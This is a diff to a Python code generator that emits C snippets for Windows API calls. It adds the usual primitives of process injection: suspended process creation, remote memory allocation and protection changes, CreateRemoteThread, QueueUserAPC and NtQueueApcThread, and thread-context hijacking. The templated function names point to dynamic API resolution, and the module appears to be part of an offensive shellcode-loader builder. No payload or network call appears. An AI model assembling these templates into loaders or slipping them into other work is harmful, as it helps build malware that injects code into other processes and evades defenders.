@@ -1,4 +1,5 @@
 from string import Template
+from pathlib import Path, PureWindowsPath
 
 def VirtualProtect(lpAddress, dwSize, flNewProtect):
     return Template("""
@@ -6,12 +7,23 @@ def VirtualProtect(lpAddress, dwSize, flNewProtect):
     {VirtualProtect}($lpAddress, $dwSize, $flNewProtect, &oldProtect);
 """).substitute(lpAddress=lpAddress, dwSize=dwSize, flNewProtect=flNewProtect)
     
+def VirtualProtectEx(hProcess, lpAddress, dwSize, flNewProtect):
+    return Template("""
+    DWORD oldProtect;
+    {VirtualProtectEx}($hProcess, $lpAddress, $dwSize, $flNewProtect, &oldProtect);
+""").substitute(hProcess=hProcess, lpAddress=lpAddress, dwSize=dwSize, flNewProtect=flNewProtect)
+
 def NtProtectVirtualMemory(ProcessHandle, BaseAddress, RegionSize, NewProtection):
     return Template("""
     SIZE_T size = $RegionSize;
     ULONG OldProtect; 
     {NtProtectVirtualMemory}($ProcessHandle, &$BaseAddress, &size, $NewProtection, &OldProtect);
 """).substitute(ProcessHandle=ProcessHandle, BaseAddress=BaseAddress, RegionSize=RegionSize, NewProtection=NewProtection )
+
+def VirtualAllocEx(output, hProcess, dwSize, flAllocationType, flProtect):
+    return Template("""
+    LPVOID $output = {VirtualAllocEx}($hProcess, NULL, $dwSize, $flAllocationType, $flProtect);
+""").substitute(output=output, hProcess=hProcess, dwSize=dwSize, flAllocationType=flAllocationType, flProtect=flProtect)
 
 def VirtualAlloc(output, dwSize, flAllocationType, flProtect):
     return Template("""
@@ -95,3 +107,82 @@ def NtFreeVirtualMemory(ProcessHandle, lpAddress):
     return Template("""
     {NtFreeVirtualMemory}($ProcessHandle, $lpAddress, 0, MEM_RELEASE);
 """).substitute(ProcessHandle=ProcessHandle, lpAddress=lpAddress)
+
+def CreateProcessA(target):
+    return Template("""
+    STARTUPINFOA si = {{
+        sizeof(si)
+    }}; 
+    PROCESS_INFORMATION pi; 
+
+    {CreateProcessA}(NULL, (LPSTR) "$target", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+    HANDLE hProcess = pi.hProcess;
+    HANDLE hThread = pi.hThread;                
+""").substitute(target=target)
+
+def NtCreateUserProcess(target):
+    parsed = PureWindowsPath(target)
+    curdir = str(parsed.parent).replace('\\','\\\\')
+    image = str(parsed.name).replace('\\','\\\\')
+    return Template("""
+    UNICODE_STRING image = RTL_CONSTANT_STRING(L"$target");
+    UNICODE_STRING cmdline = RTL_CONSTANT_STRING(L"$image");
+    UNICODE_STRING curdir = RTL_CONSTANT_STRING(L"$curdir");
+    UNICODE_STRING desktop = RTL_CONSTANT_STRING(L"WinSta0\\\\Default");
+    WCHAR kNtImage[] = L"\\\\??\\\\$target";
+    
+    PRTL_USER_PROCESS_PARAMETERS procParams = NULL;
+    PS_CREATE_INFO createInfo    = {{ sizeof(createInfo) }};     /* State defaults to initial */
+    PS_ATTRIBUTE_LIST attrList = {{ sizeof(attrList) }};  /* room for exactly one */
+    HANDLE hProcess = NULL;
+    HANDLE hThread = NULL;
+    LPWCH  env;
+ 
+    attrList.Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
+    attrList.Attributes[0].Size      = sizeof(kNtImage) - sizeof(WCHAR);
+    attrList.Attributes[0].ValuePtr  = (PVOID)kNtImage;
+
+    env = GetEnvironmentStringsW();
+ 
+    {RtlCreateProcessParametersEx}(&procParams, &image, NULL, &curdir, &cmdline, env, NULL, &desktop, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED);
+ 
+    {NtCreateUserProcess}(&hProcess, &hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, 0, THREAD_CREATE_FLAGS_CREATE_SUSPENDED, procParams, &createInfo, &attrList);
+""").substitute(target=target, image=image, curdir=curdir)
+
+def CreateRemoteThread(output, hProcess, lpStartAddress):
+    return Template("""
+    HANDLE $output = {CreateRemoteThread}($hProcess, NULL, 0, $lpStartAddress, NULL, 0, NULL);
+    """).substitute(output=output, hProcess=hProcess, lpStartAddress=lpStartAddress)
+
+def QueueUserAPC(pfnAPC, hThread):
+    return Template("""
+    {QueueUserAPC}((PAPCFUNC)$pfnAPC, $hThread, (ULONG_PTR)NULL);
+""").substitute(pfnAPC=pfnAPC, hThread=hThread)
+
+def ResumeThread(hThread):
+    return Template("""
+    {ResumeThread}($hThread);                 
+""").substitute(hThread=hThread)
+
+def GetThreadContext(output, hThread):
+    return Template("""
+    CONTEXT $output = {{ 0 }};
+    $output.ContextFlags = CONTEXT_CONTROL; // e.g., RIP/RSP/EBP
+    {GetThreadContext}($hThread, &$output);
+""").substitute(hThread=hThread, output=output)
+
+def SetThreadContext(context, hThread):
+    return Template("""
+    {SetThreadContext}($hThread, &$context);
+""").substitute(hThread=hThread, context=context)
+
+def NtCreateThreadEx(output, hProcess, lpStartAddress):
+    return Template("""
+    HANDLE $output;
+    {NtCreateThreadEx}(&$output, THREAD_ALL_ACCESS, NULL, $hProcess, (PVOID)$lpStartAddress, NULL, (SIZE_T)0, (SIZE_T)0, (SIZE_T)0, (SIZE_T)0, NULL);
+""").substitute(output=output, hProcess=hProcess, lpStartAddress=lpStartAddress)
+
+def NtQueueApcThread(hThread, pfnAPC):
+    return Template("""
+    {NtQueueApcThread}($hThread, $pfnAPC, NULL, NULL, 0);
+""").substitute(pfnAPC=pfnAPC, hThread=hThread)
